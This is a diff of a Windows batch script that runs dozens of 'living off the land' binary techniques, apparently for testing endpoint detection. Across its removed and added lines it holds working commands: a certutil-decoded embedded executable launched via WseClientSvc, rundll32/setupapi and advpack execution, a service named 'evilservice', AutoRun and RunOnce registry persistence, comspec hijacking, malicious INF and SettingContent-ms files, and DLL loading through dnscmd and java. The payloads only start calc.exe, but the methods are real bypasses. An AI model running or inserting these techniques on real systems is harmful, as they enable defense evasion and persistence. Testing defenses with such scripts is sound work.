@@ -1,211 +1,150 @@
-REM start line 441
-REM end line 648
+REM start line 648
+REM end line 1009
 
-
-start "" cmd /c rundll32 setupapi,InstallHinfSection DefaultInstall 132 calc.inf
-echo Execution Finished at %time% %date% 
-echo Command Excuted: rundll32 setupapi,InstallHinfSection DefaultInstall 132 calc.inf
-timeout 5
-
-echo %time% %date% [+] Testing Shdocvw exec via rundll32
-echo [InternetShortcut] > C:\windows\temp\url.url
-echo URL=file:///c:\windows\system32\calc.exe >> C:\windows\temp\url.url
-start "" cmd /c rundll32.exe shdocvw.dll, OpenURL C:\windows\temp\url.url
+echo %time% %date% [+] Testing WseClientSvc.exe exec
+REM Source taken from https://blog.huntresslabs.com/abusing-trusted-applications-a719219220f?gi=de073115ebbc
+echo -----BEGIN CERTIFICATE----- > pass.b64
+echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
+echo AAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5v >> pass.b64
+echo dCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDADpYUFsAAAAA >> pass.b64
+echo AAAAAOAAAgELAQsAAAQAAAAIAAAAAAAATiMAAAAgAAAAQAAAAABAAAAgAAAAAgAA >> pass.b64
+echo BAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAA >> pass.b64
+echo AAAAABAAAAAAAAAAAAAAAAAjAABLAAAAAEAAANAEAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
+echo AGAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
+echo AAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAA >> pass.b64
+echo VAMAAAAgAAAABAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAANAEAAAAQAAA >> pass.b64
+echo AAYAAAAGAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAADAAA >> pass.b64
+echo AAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAAwIwAAAAAAAEgAAAACAAUA >> pass.b64
+echo ZCAAAJwCAAABAAAAAQAABgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
+echo AAAAAAAAAAAAAAAAAAAAAC4AAhaaKAMAAAomKh4CKAQAAAoqQlNKQgEAAQAAAAAA >> pass.b64
+echo DAAAAHY0LjAuMzAzMTkAAAAABQBsAAAAAAEAACN+AABsAQAA0AAAACNTdHJpbmdz >> pass.b64
+echo AAAAADwCAAAIAAAAI1VTAEQCAAAQAAAAI0dVSUQAAABUAgAASAAAACNCbG9iAAAA >> pass.b64
+echo AAAAAAIAAAFHFQAACQAAAAD6JTMAFgAAAQAAAAQAAAACAAAAAgAAAAEAAAAEAAAA >> pass.b64
+echo AgAAAAEAAAACAAAAAAAKAAEAAAAAAAYANAAtAAYAawBLAAYAiwBLAAoAwQCuAAAA >> pass.b64
+echo AAABAAAAAAABAAEAAAAQABMAGwAFAAEAAQBQIAAAAACRADsACgABAFwgAAAAAIYY >> pass.b64
+echo QAAQAAIAAAABAEYAEQBAABQAGQBAABAAIQDJABkACQBAABAALgALAB8ALgATACgA >> pass.b64
+echo BIAAAAAAAAAAAAAAAAAAAAAAqQAAAAQAAAAAAAAAAAAAAAEAJAAAAAAABAAAAAAA >> pass.b64
+echo AAAAAAAAAQAtAAAAAAAAAAA8TW9kdWxlPgBwYXNzLmV4ZQBQcm9ncmFtAHBhc3N0 >> pass.b64
+echo aHJ1AG1zY29ybGliAFN5c3RlbQBPYmplY3QATWFpbgAuY3RvcgBhcmdzAFN5c3Rl >> pass.b64
+echo bS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGlsYXRpb25SZWxheGF0aW9u >> pass.b64
+echo c0F0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBwYXNzAFN5 >> pass.b64
+echo c3RlbS5EaWFnbm9zdGljcwBQcm9jZXNzAFN0YXJ0AAAAAyAAAAAAADKi38C8gvFL >> pass.b64
+echo n9EJCAHas0cACLd6XFYZNOCJBQABAR0OAyAAAQQgAQEIBQABEhEOCAEACAAAAAAA >> pass.b64
+echo HgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dzAQAoIwAAAAAAAAAAAAA+IwAA >> pass.b64
+echo ACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMCMAAAAAAAAAAF9Db3JFeGVNYWluAG1z >> pass.b64
+echo Y29yZWUuZGxsAAAAAAD/JQAgQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
+echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
+echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
+echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
+echo AAAAAAAAAAAAAAAAAAACABAAAAAgAACAGAAAADgAAIAAAAAAAAAAAAAAAAAAAAEA >> pass.b64
+echo AQAAAFAAAIAAAAAAAAAAAAAAAAAAAAEAAQAAAGgAAIAAAAAAAAAAAAAAAAAAAAEA >> pass.b64
+echo AAAAAIAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAJAAAACgQAAAPAIAAAAAAAAAAAAA >> pass.b64
+echo 4EIAAOoBAAAAAAAAAAAAADwCNAAAAFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4A >> pass.b64
+echo RgBPAAAAAAC9BO/+AAABAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAQAAAABAAAA >> pass.b64
+echo AAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQA >> pass.b64
+echo AABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsAScAQAAAQBTAHQAcgBpAG4A >> pass.b64
+echo ZwBGAGkAbABlAEkAbgBmAG8AAAB4AQAAAQAwADAAMAAwADAANABiADAAAAAsAAIA >> pass.b64
+echo AQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAAIAAAADAACAABAEYA >> pass.b64
+echo aQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMAAuADAALgAwAC4AMAAAADQACQABAEkA >> pass.b64
+echo bgB0AGUAcgBuAGEAbABOAGEAbQBlAAAAcABhAHMAcwAuAGUAeABlAAAAAAAoAAIA >> pass.b64
+echo AQBMAGUAZwBhAGwAQwBvAHAAeQByAGkAZwBoAHQAAAAgAAAAPAAJAAEATwByAGkA >> pass.b64
+echo ZwBpAG4AYQBsAEYAaQBsAGUAbgBhAG0AZQAAAHAAYQBzAHMALgBlAHgAZQAAAAAA >> pass.b64
+echo NAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4A >> pass.b64
+echo MAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAwAC4A >> pass.b64
+echo MAAuADAALgAwAAAAAAAAAO+7vzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9 >> pass.b64
+echo IlVURi04IiBzdGFuZGFsb25lPSJ5ZXMiPz4NCjxhc3NlbWJseSB4bWxucz0idXJu >> pass.b64
+echo OnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjEiIG1hbmlmZXN0VmVyc2lvbj0i >> pass.b64
+echo MS4wIj4NCiAgPGFzc2VtYmx5SWRlbnRpdHkgdmVyc2lvbj0iMS4wLjAuMCIgbmFt >> pass.b64
+echo ZT0iTXlBcHBsaWNhdGlvbi5hcHAiLz4NCiAgPHRydXN0SW5mbyB4bWxucz0idXJu >> pass.b64
+echo OnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjIiPg0KICAgIDxzZWN1cml0eT4N >> pass.b64
+echo CiAgICAgIDxyZXF1ZXN0ZWRQcml2aWxlZ2VzIHhtbG5zPSJ1cm46c2NoZW1hcy1t >> pass.b64
+echo aWNyb3NvZnQtY29tOmFzbS52MyI+DQogICAgICAgIDxyZXF1ZXN0ZWRFeGVjdXRp >> pass.b64
+echo b25MZXZlbCBsZXZlbD0iYXNJbnZva2VyIiB1aUFjY2Vzcz0iZmFsc2UiLz4NCiAg >> pass.b64
+echo ICAgIDwvcmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICA8L3NlY3VyaXR5Pg0KICA8 >> pass.b64
+echo L3RydXN0SW5mbz4NCjwvYXNzZW1ibHk+DQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
+echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
+echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
+echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
+echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
+echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
+echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
+echo ACAAAAwAAABQMwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
+echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
+echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
+echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
+echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
+echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
+echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
+echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
+echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
+echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
+echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA= >> pass.b64
+echo -----END CERTIFICATE----- >> pass.b64
+start "" cmd /c certutil -f -decode pass.b64 pass_TestBin.exe >nul
+start "" cmd /c WseClientSvc.exe pass_TestBin.exe calc.exe
 echo Execution Finished at %time% %date%
-echo Command Excuted: [InternetShortcut] > C:\windows\temp\url.url
-echo Command Excuted: URL=file:///c:\windows\system32\calc.exe >> C:\windows\temp\url.url
-echo Command Excuted: rundll32.exe shdocvw.dll, OpenURL C:\windows\temp\url.url
-
-timeout 5
-
-echo %time% %date% [+] Testing csc exec
-
-echo public class x{public static void Main(){System.Diagnostics.Process.Start("calc");}} >>  payload.cs
-
-start "" cmd /c  C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:payload.exe payload.cs
-start "" cmd /c  C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe /out:payload.exe payload.cs
-start "" cmd /c  C:\Windows\Microsoft.NET\Framework\v4.0.30319\Csc.exe /out:payload.exe payload.cs
-start "" cmd /c  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Csc.exe /out:payload.exe payload.cs
-start "" cmd /c  payload.exe
-echo Execution Finished at %time% %date%
-echo Command Excuted: public class x{public static void Main(){System.Diagnostics.Process.Start("calc");}} >>  payload.cs
-echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:payload.exe payload.cs
-echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe /out:payload.exe payload.cs
-echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v4.0.30319\Csc.exe /out:payload.exe payload.cs
-echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Csc.exe /out:payload.exe payload.cs
-echo Command Excuted: payload.exe 
-timeout 5
-echo %time% %date% [+] Testing advpack exec
-start "" cmd /c rundll32.exe advpack.dll,RegisterOCX calc.exe
-echo Execution Finished at %time% %date%
-echo Command Excuted: rundll32.exe advpack.dll,RegisterOCX calc.exe
-timeout 5
-echo %time% %date% [+] Testing Scriptrunner exec
-start "" cmd /c scriptrunner.exe -appvscript calc.exe   
-echo Execution Finished at %time% %date%
-echo Command Excuted: scriptrunner.exe -appvscript calc.exe
-
-timeout 5
-
-echo %time% %date% [+] Testing SC exec
-start "" cmd /c sc create evilservice binPath= "C:\windows\system32\calc.exe" DisplayName= "evilservice" start= auto     
-start "" cmd /c sc start evilservice     
-echo Execution Finished at %time% %date%
-echo Command Excuted: sc create evilservice binPath= "C:\windows\system32\cmd.exe /c calc.exe" DisplayName= "evilservice" start= auto  
-echo Command Excuted: sc start evilservice
-
-timeout 5
-
-echo %time% %date% [+] Testing Register-cimprovider exec
-start "" cmd /c Register-cimprovider -path "AllTheThings.dll"   
-echo Execution Finished at %time% %date%
-echo Command Excuted: Register-cimprovider -path "AllTheThings.dll"   
-
-timeout 5
-
-echo %time% %date% [+] Testing control.exe exec
-start "" cmd /c control.exe AllTheThings.dll
-echo Execution Finished at %time% %date%
-echo Command Excuted: control.exe AllTheThings.dll
-
-
-timeout 5
-
-echo %time% %date% [+] Testing manage-bde.wsf exec
-set comspec=C:\windows\system32\calc.exe
-start "" cmd /c cscript C:\windows\system32\manage-bde.wsf 
-echo Execution Finished at %time% %date%
-echo Command Excuted: set comspec=C:\windows\system32\calc.exe
-echo Command Excuted: cscript C:\windows\system32\manage-bde.wsf 
-REM Reset ComSpec
-set comspec=C:\WINDOWS\system32\cmd.exe
-
-timeout 5
-
-echo %time% %date% [+] Testing AppVLP.exe exec
-start "" cmd /c "C:\Program Files (x86)\Microsoft Office\root\client\AppVLP.exe" calc.exe
-echo Execution Finished at %time% %date%
-echo Command Excuted: "C:\Program Files (x86)\Microsoft Office\root\client\AppVLP.exe" calc.exe
-
-timeout 5
-
-echo %time% %date% [+] Testing ScriptRunner.exe exec
-start "" cmd /c C:\Windows\System32\ScriptRunner.exe -appvscript cmd.exe
-echo Execution Finished at %time% %date%
-echo Command Excuted: C:\Windows\System32\ScriptRunner.exe -appvscript calc.exe
-
-timeout 5
-
-echo %time% %date% [+] Testing Pester.bat (PS3.0) exec
-start "" cmd /c C:\Program Files (x86)\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat help  "; Start-Process calc.exe"
-echo Execution Finished at %time% %date%
-echo Command Excuted: C:\Program Files (x86)\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat help  "; Start-Process calc.exe"
-
-timeout 5
-
-echo %time% %date% [+] Testing powershellcustomhost.exe exec
-echo Start-Process calc.exe > calc.ps1
-start "" cmd /c "C:\Program Files\IIS\Microsoft Web Deploy V3\Scripts\powershellcustomhost.exe" calc.ps1
-echo Execution Finished at %time% %date%
-echo Command Excuted: "C:\Program Files\IIS\Microsoft Web Deploy V3\Scripts\powershellcustomhost.exe" calc.ps1
-
-timeout 5
-
-echo %time% %date% [+] Testing PresentationHosts.exe exec
-start "" cmd /c PresentationHost.exe file://c:\windows\system32\calc.exe
-echo Execution Finished at %time% %date%
-echo Command Excuted: PresentationHost.exe file://c:\windows\system32\calc.exe
-timeout 5
-
-
-echo %time% %date% [+] Testing Command Processor.exe exec
-start "" cmd /c reg add "HKCU\Software\Microsoft\Command Processor" /v AutoRun /d "start calc.exe"
-start "" cmd /c cmd.exe
-echo Execution Finished at %time% %date%
-echo Command Excuted: reg add "HKCU\Software\Microsoft\Command Processor" /v AutoRun /d "start calc.exe"
-echo Command Excuted: cmd.exe
-timeout 5
-
-echo %time% %date% [+] Testing gpup.exe exec
-start "" cmd /c "C:\Program Files (x86)\Notepad++\updater\gpup.exe -w whatever -e c:\Windows\System32\calc.exe"
-echo Execution Finished at %time% %date%
-echo Command Excuted: C:\Program Files (x86)\Notepad++\updater\gpup.exe -w whatever -e c:\Windows\System32\calc.exe
-
-timeout 5
-
-echo ^; DRIVER.INF > calc2.inf
-echo ^; Copyright (c) Microsoft Corporation.  All rights reserved. >> calc2.inf
-echo [Version] >> calc2.inf
-echo Signature = "$CHICAGO$" >> calc2.inf
-echo Class=61883 >> calc2.inf
-echo ClassGuid={7EBEFBC0-3200-11d2-B4C2-00A0C9697D17} >> calc2.inf
-echo Provider=%Msft% >> calc2.inf
-echo DriverVer=06/21/2006,6.1.7600.16385 >> calc2.inf
-echo [DestinationDirs] >> calc2.inf
-echo DefaultDestDir = 1 >> calc2.inf
-echo [DefaultInstall] >> calc2.inf
-echo AddReg = CalcStart >> calc2.inf
-echo [CalcStart] >> calc2.inf
-echo HKLM,Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce,Install,,cmd.exe /c """calc.exe""" >> calc2.inf
-
-echo %time% %date% [+] Testing VBoxDrvInst.exe exec
-start "" cmd /c "C:\Program Files\Oracle\VirtualBox Guest Additions\VBoxDrvInst.exe" driver executeinf calc2.inf 
-echo Execution Finished at %time% %date%
-echo Command Excuted: "C:\Program Files\Oracle\VirtualBox Guest Additions\VBoxDrvInst.exe" driver executeinf calc2.inf 
-
-timeout 5
-
-echo %time% %date% [+] Testing InstallHinfSection exec
-start "" cmd /c "C:\Program Files (x86)\Citrix\ICA Client\Drivers64\Usbinst.exe" InstallHinfSection "DefaultInstall 128 calc2.inf"
-echo Execution Finished at %time% %date%
-echo Command Excuted: "C:\Program Files (x86)\Citrix\ICA Client\Drivers64\Usbinst.exe" InstallHinfSection "DefaultInstall 128 calc2.inf"
-
-timeout 5
-
-echo %time% %date% [+] Testing Atbroker exec
-start "" cmd /c "C:\Windows\System32\Atbroker.exe C:\windows\system32\calc.exe"
-start "" cmd /c "C:\Windows\SysWOW64\Atbroker.exe C:\windows\system32\calc.exe"
-echo Execution Finished at %time% %date%
-echo Command Excuted: "C:\Windows\System32\Atbroker.exe C:\windows\system32\calc.exe"
-echo Command Excuted: "C:\Windows\SysWOW64\Atbroker.exe C:\windows\system32\calc.exe"
-
-
-timeout 5
-
-echo %time% %date% [+] Testing MSCONFIG exec
-echo ^<?xml version="1.0" ?^> > %windir%\System32\mscfgtlc.xml
-echo ^<MSCONFIGTOOLS^> >> %windir%\System32\mscfgtlc.xml
-echo ^<a NAME="LOLBin" PATH="%windir%\System32\cmd.exe" DEFAULT_OPT="" ADV_OPT="/c calc.exe" HELP="LOLBin MSCONFIGTOOLS"^/^> >> %windir%\System32\mscfgtlc.xml
-echo ^</MSCONFIGTOOLS^> >> %windir%\System32\mscfgtlc.xml
-start "" cmd /c msconfig.exe
-echo Execution Finished at %time% %date%
-echo Command Excuted: msconfig.exe
-
-
+echo Command Excuted: certutil -f -decode pass.b64 pass_TestBin.exe 
+echo Command Excuted: WseClientSvc.exe pass_TestBin.exe calc.exe 
 
 timeout 5
 
 
+REM ---- EOF LOLBAS Payloads ----
 
-echo %time% %date% [+] Testing DNSCMD DLL exec
-start "" cmd /c dnscmd ops_dc /config /serverlevelplugindll AllTheThings.dll 
+echo **********************************************
+echo *        Testing Custom PAYLOADS             *
+echo **********************************************
+
+
+echo %time% %date% [+] Testing winnt32 exec
+start "" cmd /c winnt32 /cmd:calc.exe
 echo Execution Finished at %time% %date%
-echo Command Excuted: dnscmd ops_dc /config /serverlevelplugindll AllTheThings.dll 
+echo Command Excuted: winnt32 /cmd:calc.exe
 
 timeout 5
 
-echo %time% %date% [+] Testing JAVA DLL exec
-start "" cmd /c java.exe -agentpath:AllTheThings.dll 
-start "" cmd /c java.exe -agentlib:AllTheThings.dll 
+echo %time% %date% [+] Testing winrs exec
+start "" cmd /c winrs -r:http://127.0.0.1 calc.exe
 echo Execution Finished at %time% %date%
-echo Command Excuted: java.exe -agentpath:AllTheThings.dll 
-echo Command Excuted: java.exe -agentlib:AllTheThings.dll  
-
-echo %time% %date% [+] Testing JAVA DLL exec
-start "" cmd /c java.exe -agentpath:AllTheThings.dll 
-start "" cmd /c java.exe -agentlib:AllTheThings.dll 
-echo Execution Finished at %time% %date%
-echo Command Excuted: java.exe -agentpath:AllTheThings.dll 
-echo Command Excuted: java.exe -agentlib:AllTheThings.dll  
+echo Command Excuted: winrs -r:http://127.0.0.1 calc.exe
 
 timeout 5
+
+REM Example: https://twitter.com/subtee/status/872244674609676288
+echo %time% %date% [+] Testing waitfor exec
+start "" cmd /c waitfor SDX & calc.exe
+timeout 3
+start "" cmd /c waitfor /s 127.0.0.1 /si SDX
+echo Execution Finished at %time% %date%
+echo Command Excuted: waitfor SDX & calc.exe
+echo Command Excuted: waitfor /s 127.0.0.1 /si SDX
+
+echo %time% %date% [+] Testing .SettingContent-ms extension exec
+echo ^<?xml version="1.0" encoding="UTF-8"?^> > Test.SettingContent-ms
+echo  ^<PCSettings^> >> Test.SettingContent-ms
+echo    ^<SearchableContent xmlns="http://schemas.microsoft.com/Search/2013/SettingContent"^> >> Test.SettingContent-ms
+echo      ^<ApplicationInformation^> >> Test.SettingContent-ms
+echo        ^<AppID^> windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel^</AppID^> >> Test.SettingContent-ms
+echo        ^<DeepLink^> %windir%\system32\calc.exe^</DeepLink^> >> Test.SettingContent-ms
+echo        ^<Icon^> %windir%\system32\control.exe^</Icon^> >> Test.SettingContent-ms
+echo      ^</ApplicationInformation^> >> Test.SettingContent-ms
+echo      ^<SettingIdentity^> >> Test.SettingContent-ms
+echo      ^<PageID^> ^</PageID^> >> Test.SettingContent-ms
+echo        ^<HostID^> {12B1697E-D3A0-4DBC-B568-CCF64A3F934D}^</HostID^> >> Test.SettingContent-ms
+echo      ^</SettingIdentity^> >> Test.SettingContent-ms
+echo      ^<SettingInformation^> >> Test.SettingContent-ms
+echo        ^<Description^> @shell32.dll,-4161^</Description^> >> Test.SettingContent-ms
+echo        ^<Keywords^> @shell32.dll,-4161^</Keywords^> >> Test.SettingContent-ms
+echo      ^</SettingInformation^> >> Test.SettingContent-ms
+echo    ^</SearchableContent^> >> Test.SettingContent-ms
+echo  ^</PCSettings^> >> Test.SettingContent-ms
+start "" cmd /c Test.SettingContent-ms
+echo Execution Finished at %time% %date%
+echo Command Excuted: Test.SettingContent-ms
+
+timeout 5
+
+
+REM ---- EOF Custom Payloads ----
+
+
